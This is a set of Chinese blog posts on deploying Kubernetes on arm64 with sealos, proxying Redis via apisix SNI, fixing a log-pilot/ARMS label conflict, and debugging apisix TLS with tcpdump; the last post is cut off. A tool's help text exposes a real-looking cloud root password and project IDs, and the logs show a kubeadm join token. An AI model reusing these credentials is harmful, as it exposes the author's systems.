[{"categories":["kubernetes","sealos"],"contents":"[TOC]\n项目的由来  随着“中兴事件”不断升级，引起了国人对国产自主可控技术的高度关注；希望能找到一个稳定、能兼容国产CPU的一整套架构方案，来构建IaaS平台和PaaS平台，满足单位对安全自主可控的需求。要基于全国产方式解决公司业务需求至少要在软硬件层面满足，而国内基本都是基于x86解决方案，想找到满足需求的国产化解决方案还是非常困难的事情。\n 说明  一个二进制工具加一个资源包，不依赖haproxy keepalived ansible等重量级工具，一条命令就可实现kubernetes高可用集群构建， 无论是单节点还是集群，单master还是多master，生产还是测试都能很好支持！简单不意味着阉割功能，照样能全量支持kubeadm所有配置。 立即获取sealos及arm64安装包\n1.20 完全移除docker. 使用containerd作为cri. kubernetes \u0026lt; 1.20, 仍使用docker\n sealos特性与优势：  支持arm64架构, v1.20版本离线包支持containerd集成，完全抛弃docker. 支持离线安装，工具与资源包（二进制程序 配置文件 镜像 yaml文件等）分离,这样不同版本替换不同离线包即可 百年证书 使用简单 支持自定义配置 内核负载，极其稳定，因为简单所以排查问题也极其简单 不依赖ansible haproxy keepalived, 一个二进制工具，0依赖 资源包放在阿里云oss上，再也不用担心网速 dashboard ingress prometheus等APP 同样离线打包，一键安装 etcd一键备份(etcd原生api调用)。支持上传至oss，实现异地备份, 用户无需关心细节。  快速开始 注意事项\n 必须同步所有服务器时间 所有服务器主机名不能重复  推荐\n系统支持：centos7.6以上 ubuntu16.04以上 内核推荐4.14以上\n推荐配置：centos7.8\n环境信息\n   主机名 IP地址     master0 192.168.0.2   master1 192.168.0.3   master2 192.168.0.4   node0 192.168.0.5    服务器密码：123456\nkubernetes高可用安装教程(arm64)\n 只需要准备好服务器(arm64)，在任意一台服务器上执行下面命令即可\n # 下载并安装sealos, sealos是个golang的二进制工具，直接下载拷贝到bin目录即可, release页面也可下载 $ wget -c https://sealyun.oss-cn-beijing.aliyuncs.com/latest/sealos-arm64 \u0026amp;\u0026amp; \\  chmod +x sealos-arm64 \u0026amp;\u0026amp; mv sealos-arm64 /usr/bin/sealos # 下载离线资源包, arm64 版本就不免费了. 请自行购买. # 安装一个三master的kubernetes集群 $ sealos init --passwd 123456 \\ --master 192.168.0.2 --master 192.168.0.3 --master 192.168.0.4 \\ --node 192.168.0.5 \\ --pkg-url /root/kube1.20.0-arm64.tar.gz \\ --version v1.20.0  参数含义\n    参数名 含义 示例     passwd 服务器密码 123456   master k8s master节点IP地址 192.168.0.2   node k8s node节点IP地址 192.168.0.3   pkg-url 离线资源包地址，支持下载到本地，或者一个远程地址 /root/kube1.19.0-arm64.tar.gz   version 资源包对应的版本 v1.19.0     增加master\n $ sealos join --master 192.168.0.6 --master 192.168.0.7 $ sealos join --master 192.168.0.6-192.168.0.9 # 或者多个连续IP  增加node\n $ sealos join --node 192.168.0.6 --node 192.168.0.7 $ sealos join --node 192.168.0.6-192.168.0.9 # 或者多个连续IP 项目的构建 我们解决的问题\n containerd支持arm64的二进制 kubernetes的arm64二进制版本(原生支持) kubernetes的基础镜像arm64版本(原生支持) 基于ipvs的高可用需要支持arm64镜像版本 快速构建打包产品, 并自动化测试及部署上线.  containerd支持arm64 官方的containerd是没有release到arm64版本的二进制, 我们只能基于官方源码, 自己构建二进制项目. 项目开源在这个仓库. 官方的github仓库.\n由于官方不发布arm64版本的containerd二进制, 所以手动编写了Makefile. 构建和 linux adm64 一模一样.\n基于ipvs的lvscare支持arm64 官方源码, 我们重写了dockerfile. 更好的支持arm64架构系列.\ndocker\n$ docker pull fanux/lvscare containerd\n$ ctr -n=k8s.io images pull docker.io/fanux/lvscare:latest 自动化ci/cd 目前采用github的action进行自动化CI/CD. 源码在这里. 测试采用华为云的鲲鹏服务器构建3master, 1node进行测试部署. 部署完成后打包发布到sealyun.com\n测试调用 因为华为云没有官方的命令行调用生成服务器/公网ip. 因此自己写了一个小工具, 快速生成ecs. 结合action进行快速部署. 下载即可使用.\n$ mycli huawei create --help create ecs in sgp Usage: mycli huawei create [flags] Flags: --FlavorRef string huawei falvor id , default is centos 7.6 (default \u0026quot;kc1.large.2\u0026quot;) --ImageRef string huawei image id , default is 2C 4G (default \u0026quot;456416e6-1270-46a4-975e-3558ac03d4cd\u0026quot;) --SubnetId string huawei subnet id (default \u0026quot;b5ea4e5d-de19-442b-ac32-3998100e4854\u0026quot;) --Vpcid string huawei Vpcid (default \u0026quot;a55545d8-a4cb-436d-a8ec-45c66aff725c\u0026quot;) --Zone string huawei AvailabilityZone , default is centos xin jia po (default \u0026quot;ap-southeast-3a\u0026quot;) --adminPass string huawei root pass (default \u0026quot;Louishong4168@123\u0026quot;) -c, --count int32 Specify huawei ecs count (default 1) --eip create huawei ecs with eip or not -h, --help help for create --keyName string ssh key name --projectId string huawei project id (default \u0026quot;06b275f705800f262f3bc014ffcdbde1\u0026quot;) Global Flags: --config string config file (default is $HOME/.mycli.yaml) 安装演示 安装, 下载最新的sealos , 以及kubernetes-arm64的安装包.\n$ wget -c https://sealyun.oss-cn-beijing.aliyuncs.com/latest/sealos-arm64 \u0026amp;\u0026amp; \\ chmod +x sealos-arm64 \u0026amp;\u0026amp; mv sealos-arm64 /usr/bin/sealos $ sealos init --master 192.168.0.35 --master 192.168.0.83 --master 192.168.0.20 \\ --node 192.168.0.242 \\ --passwd 123456 \\ --version v1.20.0 \\ --pkg-url /tmp/kube1.20.0-arm64.tar.gz ... 13:55:14 [DEBG] [print.go:21] ==\u0026gt;SendPackage==\u0026gt;KubeadmConfigInstall==\u0026gt;InstallMaster0==\u0026gt;JoinMasters==\u0026gt;JoinNodes 13:55:14 [INFO] [print.go:26] sealos install success. ___ ___ ___ ___ ___ ___ /\\ \\ /\\ \\ /\\ \\ /\\__\\ /\\ \\ /\\ \\ /::\\ \\ /::\\ \\ /::\\ \\ /:/ / /::\\ \\ /::\\ \\ /:/\\ \\ \\ /:/\\:\\ \\ /:/\\:\\ \\ /:/ / /:/\\:\\ \\ /:/\\ \\ \\ _\\:\\~\\ \\ \\ /::\\~\\:\\ \\ /::\\~\\:\\ \\ /:/ / /:/ \\:\\ \\ _\\:\\~\\ \\ \\ /\\ \\:\\ \\ \\__\\ /:/\\:\\ \\:\\__\\ /:/\\:\\ \\:\\__\\ /:/__/ /:/__/ \\:\\__\\ /\\ \\:\\ \\ \\__\\ \\:\\ \\:\\ \\/__/ \\:\\~\\:\\ \\/__/ \\/__\\:\\/:/ / \\:\\ \\ \\:\\ \\ /:/ / \\:\\ \\:\\ \\/__/ \\:\\ \\:\\__\\ \\:\\ \\:\\__\\ \\::/ / \\:\\ \\ \\:\\ /:/ / \\:\\ \\:\\__\\ \\:\\/:/ / \\:\\ \\/__/ /:/ / \\:\\ \\ \\:\\/:/ / \\:\\/:/ / \\::/ / \\:\\__\\ /:/ / \\:\\__\\ \\::/ / \\::/ / \\/__/ \\/__/ \\/__/ \\/__/ \\/__/ \\/__/ 官方文档：sealyun.com 项目地址：github.com/fanux/sealos QQ群 ：98488045 常见问题：sealyun.com/faq 查看部署状态\nkubectl get node \u0026amp;\u0026amp; kubectl get pod -A NAME STATUS ROLES AGE VERSION sealos Ready control-plane,master 4m55s v1.20.0 sealos-0001 Ready control-plane,master 4m17s v1.20.0 sealos-0002 Ready control-plane,master 4m16s v1.20.0 sealos-0003 Ready \u0026lt;none\u0026gt; 3m27s v1.20.0 NAMESPACE NAME READY STATUS RESTARTS AGE kube-system calico-kube-controllers-69b47f4dfb-2mcv2 1/1 Running 0 4m38s kube-system calico-node-g78tq 1/1 Running 0 3m32s kube-system calico-node-gccbm 1/1 Running 0 3m27s kube-system calico-node-gjw2r 1/1 Running 0 4m38s kube-system calico-node-hc4t8 1/1 Running 0 4m17s kube-system coredns-74ff55c5b-9fjnm 1/1 Running 0 4m38s kube-system coredns-74ff55c5b-nttdl 1/1 Running 0 4m38s kube-system etcd-sealos 1/1 Running 0 4m37s kube-system etcd-sealos-0001 1/1 Running 0 3m59s kube-system etcd-sealos-0002 1/1 Running 0 3m57s kube-system kube-apiserver-sealos 1/1 Running 0 4m37s kube-system kube-apiserver-sealos-0001 1/1 Running 0 4m17s kube-system kube-apiserver-sealos-0002 1/1 Running 1 3m54s kube-system kube-controller-manager-sealos 1/1 Running 1 4m36s kube-system kube-controller-manager-sealos-0001 1/1 Running 0 4m17s kube-system kube-controller-manager-sealos-0002 1/1 Running 0 2m59s kube-system kube-proxy-7bs98 1/1 Running 0 4m17s kube-system kube-proxy-88lv5 1/1 Running 0 4m38s kube-system kube-proxy-g8zfj 1/1 Running 0 3m32s kube-system kube-proxy-gl6vd 1/1 Running 0 3m27s kube-system kube-scheduler-sealos 1/1 Running 1 4m37s kube-system kube-scheduler-sealos-0001 1/1 Running 0 4m17s kube-system kube-scheduler-sealos-0002 1/1 Running 0 2m50s kube-system kube-sealyun-lvscare-sealos-0003 1/1 Running 0 3m23s [root@sealos-0001 ~]# arch aarch64 至此, arm64版本的kubernetes云平台构建完毕.\n","permalink":"https://www.fenghong.tech/blog/kubernetes/sealos-install-arm64-1.20/","tags":["kubernetes","containerd","arm64"],"title":"一键在arm64架构上部署高可用kubernetes v1.20.0集群"},{"categories":["kubernetes","sealos"],"contents":"[TOC]\n 一个二进制工具加一个资源包，不依赖haproxy keepalived ansible等重量级工具，一条命令就可实现kubernetes高可用集群构建， 无论是单节点还是集群，单master还是多master，生产还是测试都能很好支持！简单不意味着阉割功能，照样能全量支持kubeadm所有配置。 立即获取sealos及arm64安装包\n sealos特性与优势：  支持arm 支持离线安装，工具与资源包（二进制程序 配置文件 镜像 yaml文件等）分离,这样不同版本替换不同离线包即可 百年证书 使用简单 支持自定义配置 内核负载，极其稳定，因为简单所以排查问题也极其简单 不依赖ansible haproxy keepalived, 一个二进制工具，0依赖 资源包放在阿里云oss上，再也不用担心网速 dashboard ingress prometheus等APP 同样离线打包，一键安装 etcd一键备份(etcd原生api调用)。支持上传至oss，实现异地备份, 用户无需关心细节。  快速开始 注意事项\n 必须同步所有服务器时间 所有服务器主机名不能重复  推荐\n系统支持：centos7.6以上 ubuntu16.04以上 内核推荐4.14以上\n推荐配置：centos7.8\n环境信息\n   主机名 IP地址     master0 192.168.0.2   master1 192.168.0.3   master2 192.168.0.4   node0 192.168.0.5    服务器密码：123456\nkubernetes高可用安装教程(arm64)\n 只需要准备好服务器(arm64)，在任意一台服务器上执行下面命令即可\n # 下载并安装sealos, sealos是个golang的二进制工具，直接下载拷贝到bin目录即可, release页面也可下载 wget -c https://sealyun.oss-cn-beijing.aliyuncs.com/latest/sealos-arm64 \u0026amp;\u0026amp; \\  chmod +x sealos-arm64 \u0026amp;\u0026amp; mv sealos-arm64 /usr/bin/sealos # 下载离线资源包, arm64 版本就不免费了. 请自行购买. # 安装一个三master的kubernetes集群 $ sealos init --passwd 123456 --master 192.168.0.2 --master 192.168.0.3 --master 192.168.0.4 --node 192.168.0.5 --pkg-url /root/kube1.19.0-arm64.tar.gz --version v1.19.0  参数含义\n    参数名 含义 示例     passwd 服务器密码 123456   master k8s master节点IP地址 192.168.0.2   node k8s node节点IP地址 192.168.0.3   pkg-url 离线资源包地址，支持下载到本地，或者一个远程地址 /root/kube1.19.0-arm64.tar.gz   version 资源包对应的版本 v1.19.0     增加master\n $ sealos join --master 192.168.0.6 --master 192.168.0.7 $ sealos join --master 192.168.0.6-192.168.0.9 # 或者多个连续IP  增加node\n $ sealos join --node 192.168.0.6 --node 192.168.0.7 $ sealos join --node 192.168.0.6-192.168.0.9 # 或者多个连续IP init example  部署3 master和 1 node. 架构是arm64. 基础镜像是centos7.8\n $ sealos init --master 192.168.0.208 --master 192.168.0.143 --master 192.168.0.223 --node 192.168.0.233 --passwd 123456 --version v1.19.0 --pkg-url /tmp/kube1.19.0-arm64.tar.gz ... 20:18:26 [INFO] [ssh.go:51] [192.168.0.223:22] [kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap... 20:18:26 [INFO] [ssh.go:51] [192.168.0.143:22] [kubeconfig] Using existing kubeconfig file: \u0026#34;/etc/kubernetes/controller-manager.conf\u0026#34; 20:18:27 [INFO] [ssh.go:51] [192.168.0.143:22] [kubeconfig] Using existing kubeconfig file: \u0026#34;/etc/kubernetes/scheduler.conf\u0026#34; 20:18:27 [INFO] [ssh.go:51] [192.168.0.143:22] [control-plane] Creating static Pod manifest for \u0026#34;kube-controller-manager\u0026#34; 20:18:27 [INFO] [ssh.go:51] [192.168.0.143:22] [kubelet-start] Writing kubelet configuration to file \u0026#34;/var/lib/kubelet/config.yaml\u0026#34; 20:18:27 [INFO] [ssh.go:51] [192.168.0.143:22] [kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap... 20:18:37 [INFO] [ssh.go:51] [192.168.0.223:22] [etcd] Announced new etcd member joining to the existing etcd cluster 20:18:37 [INFO] [ssh.go:51] [192.168.0.223:22] [etcd] Waiting for the new etcd member to join the cluster. This can take up to 40s 20:18:49 [INFO] [ssh.go:51] [192.168.0.223:22] [upload-config] Storing the configuration used in ConfigMap \u0026#34;kubeadm-config\u0026#34; in the \u0026#34;kube-system\u0026#34; Namespace 20:18:56 [INFO] [ssh.go:51] [192.168.0.143:22] [etcd] Announced new etcd member joining to the existing etcd cluster 20:18:56 [INFO] [ssh.go:51] [192.168.0.143:22] [etcd] Waiting for the new etcd member to join the cluster. This can take up to 40s 20:18:56 [INFO] [ssh.go:51] [192.168.0.223:22] [mark-control-plane] Marking the node sealos-0002 as control-plane by adding the label \u0026#34;node-role.kubernetes.io/master=\u0026#39;\u0026#39;\u0026#34; 20:18:56 [INFO] [ssh.go:51] [192.168.0.223:22] 20:18:56 [INFO] [ssh.go:58] [ssh][192.168.0.223:22] sed \u0026#34;s/192.168.0.208 apiserver.cluster.local/192.168.0.223 apiserver.cluster.local/g\u0026#34; -i /etc/hosts 20:18:57 [INFO] [ssh.go:58] [ssh][192.168.0.223:22] mkdir -p /root/.kube \u0026amp;\u0026amp; cp -i /etc/kubernetes/admin.conf /root/.kube/config 20:18:57 [INFO] [ssh.go:58] [ssh][192.168.0.223:22] rm -rf /root/kube || : 20:18:58 [INFO] [ssh.go:51] [192.168.0.143:22] [upload-config] Storing the configuration used in ConfigMap \u0026#34;kubeadm-config\u0026#34; in the \u0026#34;kube-system\u0026#34; Namespace 20:18:58 [INFO] [ssh.go:51] [192.168.0.143:22] [mark-control-plane] Marking the node sealos-0001 as control-plane by adding the label \u0026#34;node-role.kubernetes.io/master=\u0026#39;\u0026#39;\u0026#34; 20:18:59 [INFO] [ssh.go:51] [192.168.0.143:22] 20:18:59 [INFO] [ssh.go:58] [ssh][192.168.0.143:22] sed \u0026#34;s/192.168.0.208 apiserver.cluster.local/192.168.0.143 apiserver.cluster.local/g\u0026#34; -i /etc/hosts 20:18:59 [INFO] [ssh.go:58] [ssh][192.168.0.143:22] mkdir -p /root/.kube \u0026amp;\u0026amp; cp -i /etc/kubernetes/admin.conf /root/.kube/config 20:18:59 [INFO] [ssh.go:58] [ssh][192.168.0.143:22] rm -rf /root/kube || : 20:19:00 [DEBG] [print.go:20] ==\u0026gt;SendPackage==\u0026gt;KubeadmConfigInstall==\u0026gt;InstallMaster0==\u0026gt;JoinMasters 20:19:00 [INFO] [ssh.go:13] [ssh][192.168.0.233:22] sealos route --host 192.168.0.233 20:19:00 [DEBG] [ssh.go:25] [ssh][192.168.0.233:22]command result is: ok 20:19:00 [INFO] [ssh.go:51] [192.168.0.233:22] 20:19:00 [WARN] [service.go:119] IsVirtualServerAvailable warn: virtual server is empty. 20:19:00 [INFO] [ssh.go:58] [ssh][192.168.0.233:22] kubeadm join 10.103.97.2:6443 --token dj481d.x6uuozqh8n5a9ppx --discovery-token-ca-cert-hash sha256:2777e62c68c5907e480b98be5d5668cc5a89a08eb47f70a7e04e2c2fddd5a9b2 -v 0 20:19:01 [INFO] [ssh.go:51] [192.168.0.233:22] [preflight] Running pre-flight checks 20:19:01 [INFO] [ssh.go:51] [192.168.0.233:22] [WARNING FileExisting-socat]: socat not found in system path 20:19:11 [INFO] [ssh.go:51] [192.168.0.233:22] [preflight] Reading configuration from the cluster... 20:19:11 [INFO] [ssh.go:51] [192.168.0.233:22] [kubelet-start] Writing kubelet configuration to file \u0026#34;/var/lib/kubelet/config.yaml\u0026#34; 20:19:11 [INFO] [ssh.go:51] [192.168.0.233:22] [kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap... 20:19:34 [INFO] [ssh.go:13] [ssh][192.168.0.233:22] mkdir -p /etc/kubernetes/manifests 20:19:34 [DEBG] [ssh.go:25] [ssh][192.168.0.233:22]command result is: 20:19:34 [INFO] [scp.go:158] [ssh][192.168.0.233:22]transfer total size is: 0MB 20:19:34 [INFO] [ssh.go:58] [ssh][192.168.0.233:22] rm -rf /root/kube 20:19:35 [DEBG] [print.go:20] ==\u0026gt;SendPackage==\u0026gt;KubeadmConfigInstall==\u0026gt;InstallMaster0==\u0026gt;JoinMasters==\u0026gt;JoinNodes  安装完成后. pod正常运行.\n [root@sealos-0001 ~]# kubectl get pod -A NAMESPACE NAME READY STATUS RESTARTS AGE kube-system calico-kube-controllers-84445dd79f-8sqcf 1/1 Running 0 2m32s kube-system calico-node-2g98f 1/1 Running 0 2m19s kube-system calico-node-k44r8 1/1 Running 0 82s kube-system calico-node-n2f4w 1/1 Running 0 90s kube-system calico-node-r4vff 1/1 Running 0 2m32s kube-system coredns-66bff467f8-nnng4 1/1 Running 0 2m32s kube-system coredns-66bff467f8-xgk55 1/1 Running 0 2m32s kube-system etcd-sealos 1/1 Running 0 2m39s kube-system etcd-sealos-0001 1/1 Running 0 2m kube-system etcd-sealos-0002 1/1 Running 0 2m kube-system kube-apiserver-sealos 1/1 Running 0 2m39s kube-system kube-apiserver-sealos-0001 1/1 Running 1 115s kube-system kube-apiserver-sealos-0002 1/1 Running 0 2m19s kube-system kube-controller-manager-sealos 1/1 Running 1 2m39s kube-system kube-controller-manager-sealos-0001 1/1 Running 0 56s kube-system kube-controller-manager-sealos-0002 1/1 Running 0 2m18s kube-system kube-proxy-8bbmq 1/1 Running 0 90s kube-system kube-proxy-c4zvv 1/1 Running 0 2m19s kube-system kube-proxy-ch52f 1/1 Running 0 2m32s kube-system kube-proxy-s5rp4 1/1 Running 0 82s kube-system kube-scheduler-sealos 1/1 Running 1 2m39s kube-system kube-scheduler-sealos-0001 1/1 Running 0 62s kube-system kube-scheduler-sealos-0002 1/1 Running 0 2m18s kube-system kube-sealyun-lvscare-sealos-0003 1/1 Running 0 10s [root@sealos-0001 ~]# kubectl get nodes NAME STATUS ROLES AGE VERSION sealos Ready master 3m11s v1.19.0 sealos-0001 Ready master 2m38s v1.19.0 sealos-0002 Ready master 2m39s v1.19.0 sealos-0003 Ready \u0026lt;none\u0026gt; 102s v1.19.0 [root@sealos-0001 ~]# kubectl get nodes -owide NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME sealos Ready master 3m17s v1.19.0 192.168.0.208 \u0026lt;none\u0026gt; CentOS Linux 7 (AltArch) 4.18.0-80.7.2.el7.aarch64 docker://19.3.12 sealos-0001 Ready master 2m44s v1.19.0 192.168.0.143 \u0026lt;none\u0026gt; CentOS Linux 7 (AltArch) 4.18.0-80.7.2.el7.aarch64 docker://19.3.12 sealos-0002 Ready master 2m45s v1.19.0 192.168.0.223 \u0026lt;none\u0026gt; CentOS Linux 7 (AltArch) 4.18.0-80.7.2.el7.aarch64 docker://19.3.12 sealos-0003 Ready \u0026lt;none\u0026gt; 108s v1.19.0 192.168.0.233 \u0026lt;none\u0026gt; CentOS Linux 7 (AltArch) 4.18.0-80.7.2.el7.aarch64 docker://19.3.12 [root@sealos-0001 ~]# arch aarch64 ","permalink":"https://www.fenghong.tech/blog/kubernetes/sealos-install-arm64/","tags":["docker","kubernetes","containerd","arm64"],"title":"一键在arm64架构上部署高可用kubernetes v1.19.0集群"},{"categories":["kubernetes"],"contents":" 背景\n公司内网kubernetes集群有很多redis， 需要按需暴露相关服务到内网环境， 由于kubernetes的clusterIP只能集群访问， 因此需要暴露到整个内网vpn环境。 实现四层代理的方案有很多， 基于apisix网关来做四层调度， 和apisix的7层代理很相似， 而且apisix支持sni的四层代理， 因此做了这个尝试。\n 开启apisix的TCP代理 第一步需要apisix支持tcp/udp, 在配置文件添加如下配置， 重启apisix即可生效。这个配置会让apisix来监听9100端口，处理stream_route的请求。\napisix: stream_proxy: # TCP/UDP proxy tcp: # TCP proxy port list - addr: 9100 tls: true 创建Stream_route 第二步，创建stream_route. 因为用sni可以复用端口，来达到管理方便的目的。 基于一个入口来处理所有的redis流量。 当然，内部程序还是用kubernetes的svc来进行链接。\ncurl http://127.0.0.1:9180/apisix/admin/stream_routes/1 -H \u0026#34;X-API-KEY: $API_KEY\u0026#34; -X PUT -d \u0026#39; { \u0026#34;sni\u0026#34;: \u0026#34;bw-svc-t2.redis.feghong.tech\u0026#34;, \u0026#34;upstream\u0026#34;: { \u0026#34;nodes\u0026#34;: { \u0026#34;172.19.7.82:6379\u0026#34;: 1 }, \u0026#34;type\u0026#34;: \u0026#34;roundrobin\u0026#34; } }\u0026#39; 客户端链接 第三步， 连接apisix的9100端口即可. 因为我这边使用的是 lb 来对接的9100的进行四层代理。\napiVersion: v1 kind: Service metadata: annotations: service.beta.kubernetes.io/alibaba-cloud-loadbalancer-AddressType: intranet service.beta.kubernetes.io/alibaba-cloud-loadbalancer-force-override-listeners: \u0026#34;true\u0026#34; service.beta.kubernetes.io/alibaba-cloud-loadbalancer-id: lb-xxx service.beta.kubernetes.io/alibaba-cloud-loadbalancer-network-type: vpc labels: app.kubernetes.io/instance: apisix app.kubernetes.io/managed-by: Tiller app.kubernetes.io/name: apisix app.kubernetes.io/version: 2.7.0 helm.sh/chart: apisix-0.3.0 name: apisix-stream namespace: infras-tx spec: externalTrafficPolicy: Local healthCheckNodePort: 31473 ports: - name: apisix-stream port: 6379 targetPort: 9100 selector: app.kubernetes.io/instance: apisix app.kubernetes.io/name: apisix sessionAffinity: ClientIP type: LoadBalancer 使用redis-cli来进行链接\n$ redis-cli -h bw-svc-t2.redis.feghong.tech -a $password --tls --sni bw-svc-t2.redis.feghong.tech 使用golang客户端链接\nimport \u0026#34;github.com/go-redis/redis/v8\u0026#34; rdb := redis.NewClient(\u0026amp;redis.Options{ Addr: \u0026#34;bw-svc-t2.redis.feghong.tech:6379\u0026#34;, Password: \u0026#34;\u0026#34;, // no password set  DB: 0, // use default DB })  To enable SSL, you can specify a tls.Config. If you are getting \u0026ldquo;x509: cannot validate certificate for xxx.xxx.xxx.xxx because it doesn\u0026rsquo;t contain any IP SANs\u0026rdquo;, try to set ServerName option:\n rdb := redis.NewClient(\u0026amp;redis.Options{ TLSConfig: \u0026amp;tls.Config{ ServerName: \u0026#34;bw-svc-t2.redis.feghong.tech\u0026#34;, }, }) 使用RDM链接, 点击一下SSL/TLS即可。 因为证书我们使用了ssl证书，满足tls握手要求。\n总结 sni的好处在于我们可以复用9100这个端口。 比如我再加一个redis的暴露， 我只需要添加一个stream_route，即可。然后根据sni来路由到我们的另外一个redis。\n比如我再添加一个mysql的路由。\ncurl http://127.0.0.1:9180/apisix/admin/stream_routes/2 -H \u0026#34;X-API-KEY: $API_KEY\u0026#34; -X PUT -d \u0026#39; { \u0026#34;sni\u0026#34;: \u0026#34;bw-svc-t3.redis.feghong.tech\u0026#34;, \u0026#34;upstream\u0026#34;: { \u0026#34;nodes\u0026#34;: { \u0026#34;172.19.7.12:6379\u0026#34;: 1 }, \u0026#34;type\u0026#34;: \u0026#34;roundrobin\u0026#34; } }\u0026#39; 访问\n$ redis-cli -h bw-svc-t3.redis.feghong.tech -a $password --tls --sni bw-svc-t3.redis.feghong.tech ","permalink":"https://www.fenghong.tech/blog/kubernetes/sni-apisix-tcp/","tags":["kubernetes","apisix"],"title":"基于sni使用apisix代理四层TCP/UDP"},{"categories":["golang"],"contents":"log-pilot分析 说道这个问题， 首先得了解log-pilot的收集日志的原理。\n Log-pilot will monitor docker events, and parse log labels on new docker conatainer, and generate appropriate log configuration and notify fluentd or filebeat process to reload the new configuration.\n 翻译过来就是， log-pilot通过观测容器启动， 然后分析log labels， 然后再生成filebeat的配置， 然后通过filebeat收集日志。\n代码分析： 主要就是获取日志配置的时候报错， 因此只需要分析这个函数即可。\nissue: https://github.com/AliyunContainerService/log-pilot/issues/331\nfunc (p *Pilot) getLogConfigs(jsonLogPath string, mounts []types.MountPoint, labels map[string]string) ([]*LogConfig, error) { var ret []*LogConfig mountsMap := make(map[string]types.MountPoint) for _, mount := range mounts { mountsMap[mount.Destination] = mount } var labelNames []string //sort keys \tfor k := range labels { labelNames = append(labelNames, k) } customConfigs := make(map[string]string) sort.Strings(labelNames) root := newLogInfoNode(\u0026#34;\u0026#34;) // 通过遍历容器的 log 标签， 去匹配 前缀有 aliyun.log \tfor _, k := range labelNames { for _, prefix := range p.logPrefix { customConfig := fmt.Sprintf(LABEL_SERVICE_LOGS_CUSTOME_CONFIG_TEMPL, prefix) if customConfig == k { configs := strings.Split(labels[k], \u0026#34;\\n\u0026#34;) for _, c := range configs { if c == \u0026#34;\u0026#34; { continue } customLabel := strings.SplitN(c, \u0026#34;=\u0026#34;, 2) customConfigs[customLabel[0]] = customLabel[1] } continue } serviceLogs := fmt.Sprintf(LABEL_SERVICE_LOGS_TEMPL, prefix) if !strings.HasPrefix(k, serviceLogs) || strings.Count(k, \u0026#34;.\u0026#34;) == 1 { continue } logLabel := strings.TrimPrefix(k, serviceLogs) // 这个地方， 会通过logLabel去初始化节点。 \tif err := root.insert(strings.Split(logLabel, \u0026#34;.\u0026#34;), labels[k]); err != nil { return nil, err } } } for name, node := range root.children { logConfig, err := p.parseLogConfig(name, node, jsonLogPath, mountsMap) if err != nil { return nil, err } CustomConfig(name, customConfigs, logConfig) ret = append(ret, logConfig) } return ret, nil } // 这个是去插入tags和初始化lognode节点相关 // 如果只有tags配置， 没有父节点， // 也就是 没有 aliyun_log_xxxx， 只有 aliyun_log_xxxx_tags. 则报错xxx has no parent node 。 func (node *LogInfoNode) insert(keys []string, value string) error { if len(keys) == 0 { return nil } key := keys[0] if len(keys) \u0026gt; 1 { if child, ok := node.children[key]; ok { child.insert(keys[1:], value) } else { return fmt.Errorf(\u0026#34;%s has no parent node\u0026#34;, key) } } else { child := newLogInfoNode(value) node.children[key] = child } return nil } arms相关 使用阿里云的arms很简单， 直接在deployment上面添加anotations即可\nsepc: template: metadata: annotations: armsPilotAutoEnable: \u0026#34;on\u0026#34; armsPilotCreateAppName: staging-demo-service 底层是通过anotations去pod启动的时候注入initcontianer。配置java_tools等参数， 还做了一些很奇怪的事情， 比如添加环境变量。然后链接arms服务。\n结论 开启arms。会在pod启动的时候，注入环境变量如下：\naliyun_logs_armsappid_tags=appid=dtqic8hnej@fc640b40f8635e2， 同时 会在改该容器打一个aliyun.logs.armsappid.tags:appid=dtqic8hnej@fc640b40f8635e2 标签。\n导致log-pilot程序回去寻找 aliyun.logs.armsappid.tags 的父节点。 然而， arms的父节点没有定义， 因此报错。\n修复方法 因此，临时修复的方法是， 如果label匹配了arms， 我就直接跳过初始化节点操作。\nlogLabel := strings.TrimPrefix(k, serviceLogs) // 如果logLabel带有arms的，直接跳过， 不做校验。 \t// 因此需要避免 索引起 *arms* 名字， 导致匹配这条，因此不会向es输出日志 \tif strings.Contains(logLabel, \u0026#34;arms\u0026#34;) { continue } // 这个地方， 会通过logLabel去初始化节点。 \tif err := root.insert(strings.Split(logLabel, \u0026#34;.\u0026#34;), labels[k]); err != nil { return nil, err } 阿里云官方 在arms的pilot的deploymet上， 添加 ARMS_SLS_TAG_SWITCH = \u0026ldquo;off\u0026rdquo; 这个环境变量， 重启arms-pilot即可。\n","permalink":"https://www.fenghong.tech/blog/go/log-pilot/","tags":["log","docker"],"title":"记一次阿里云arms监控和log-pilot日志系统冲突及解决"},{"categories":["kubernetes"],"contents":"[TOC]\n背景  由于生产环境需要添加dcdn和waf等相关加速和防护措施， 因此在对接apisix的出现了这个问题。\napisix具体是啥，这里不赘述了， 可以查看apisix官网\n 一般网站的架构。\n-\u0026gt; slb -\u0026gt; 网关 升级后的架构。\n## 场景1 -\u0026gt; dcdn -\u0026gt; slb -\u0026gt; 网关 ## 场景2 -\u0026gt; dcdn -\u0026gt; waf -\u0026gt; slb -\u0026gt; 网关 复现问题 场景1， 如果没有添加sni回源， 这个时候apisix会直接在tls握手报错。\n场景2， 即使dcnd添加了sni回源， apisix也会直接在tls握手报错.\n抓包分析。 我们这边使用tcpdump进行抓包。因为是在k8s集群中运行的， 需要到相应的节点运行\n首先， 查找对应pod的节点。\n$ kubectl get pods -n infras-tx -o wide | grep apisix apisix-79d5b785f6-frbvk 1/1 Running 0 145m 172.16.104.174 cn-hangzhou.i-bp1j5jrkodvty73nb57d \u0026lt;none\u0026gt; \u0026lt;none\u0026gt;kubectl get pods -n infras-tx -o wide | grep apisix 其次， 找到对应的节点， 找到对应的容器的id， 根据id来找pid。\n$ docker inspect -f {{.State.Pid}} `docker ps|grep apisix| awk '{print $1}'` 2691530 然后使用 nsenter 进入网络抓包, 如果没有，需要安装nsenter工具. 在使用tcmdump抓包即可。抓包的时候， 需要配置访问一下， 然后分析一下抓包文件即可。\n$ yum -y install util-linux.x86_64 $ nsenter --target 2691530 $ tcpdump -i eth0 -s 0 -w /var/tmp/1.cap 因为我们这边很明确， 就是tls握手有问题， 我们只需要对抓包文件的tls握手分析即可。\ntcp stream 图， 从steam图中可以清晰看到\ntls.handshake 图\n在握手阶段出现失败. 添加完sni后， 握手成功。\n很奇怪的是， 